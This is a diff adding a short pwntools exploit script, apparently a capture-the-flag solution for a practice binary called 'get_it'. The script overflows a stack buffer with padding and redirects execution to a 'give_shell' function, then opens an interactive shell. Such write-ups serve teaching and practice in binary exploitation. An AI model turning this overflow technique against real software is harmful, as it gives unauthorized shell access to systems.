@@ -1,0 +1,12 @@
+from pwn import *
+
+p = process("./get_it")
+
+e = ELF("./get_it")
+
+win = e.symbols['give_shell'] + 1
+
+payload = b"A" * 0x20 + b"B" * 0x8 + p64(win)
+p.sendlineafter(b"it??\n", payload)
+
+p.interactive()
